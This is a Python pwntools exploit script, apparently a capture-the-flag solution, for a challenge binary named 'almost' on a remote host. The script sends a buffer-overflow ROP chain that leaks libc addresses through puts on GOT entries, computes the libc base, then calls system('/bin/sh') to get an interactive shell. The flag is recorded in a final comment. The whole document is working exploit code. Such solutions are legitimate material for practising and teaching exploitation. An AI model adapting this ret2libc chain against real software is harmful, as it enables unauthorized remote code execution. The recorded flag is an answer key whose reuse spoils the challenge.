from pwn import *

exe = ELF('almost')
libc = ELF("libc6-i386_2.27-3ubuntu1.2_amd64.so")
HOST = "jh2i.com"
PORT = 50017
p = remote(HOST, PORT)


def send(protocol, domain, path, repeat=False):
    p.recvuntil(":\n")
    p.sendline(protocol)

    p.recvuntil(":\n")
    p.sendline(domain)

    p.recvuntil(':\n')
    p.sendline(path)


sleep(1)
ret = 0x80486f4

log.info("sending the first payload...")
payload = b'M' * 10
payload += p32(exe.plt['puts'])
payload += p32(exe.sym['main'])
payload += p32(exe.got['getchar'])
payload += b'Z' * (63 - len(payload))

send(b"A" * 64, b'B' * 64, payload)
log.info("first payload done")
sleep(1)
p.recvline()
p.recvline()

log.info("leaking getchar...")
getchar = u32(p.recv(4))
log.info("getchar leaked")
log.success('getchar @ 0x%x', getchar)
sleep(1)

log.info("leaking strcat...")
strcat = u32(p.recv(4))
log.info("strcat leaked")
log.success('strcat @ 0x%x', strcat)
sleep(1)

log.info("leaking puts...")
puts = u32(p.recv(4))
log.info("puts leaked")
log.success("puts @ 0x%x", puts)
sleep(1)

log.info("leaking base_libc...")
libc_base = puts - libc.sym['puts']
log.info("base_libc leaked")
log.success('Libc base @ 0x%x', libc_base)
sleep(1)

log.info("send second payload...")
payload2 = b'M' * 10
payload2 += p32(libc_base + libc.sym['system'])
payload2 += b'MMMM'
payload2 += p32(libc_base + next(libc.search(b'/bin/sh')))
payload2 += b'Z' * (63 - len(payload2))
log.info("second payload done")
sleep(1)

send(b'A' * 64, b'B' * 64, payload2)
p.recvuntil("ZZ\n")
p.interactive()

# FLAG --> flag{my_code_was_almost_secure}
